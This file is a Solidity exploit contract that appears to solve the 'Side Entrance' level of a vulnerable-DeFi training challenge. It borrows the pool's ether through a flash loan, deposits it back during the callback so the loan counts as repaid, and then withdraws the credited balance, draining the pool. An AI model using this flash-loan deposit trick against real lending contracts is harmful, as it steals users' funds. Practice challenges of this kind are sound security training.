// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../side-entrance/SideEntranceLenderPool.sol";


contract SideEntranceAttack {
    SideEntranceLenderPool private victimContract;
    uint256 amount  = 1000 * 10 ** 18;

    constructor (address _victimContractAddress) {
        victimContract = SideEntranceLenderPool(_victimContractAddress);
    }

    function start() public {
        victimContract.flashLoan(amount);
    }
    
    function execute() external payable {
        victimContract.deposit{value: amount}();
    }

    function end() public {
        victimContract.withdraw();
    }

    receive() external payable {}
}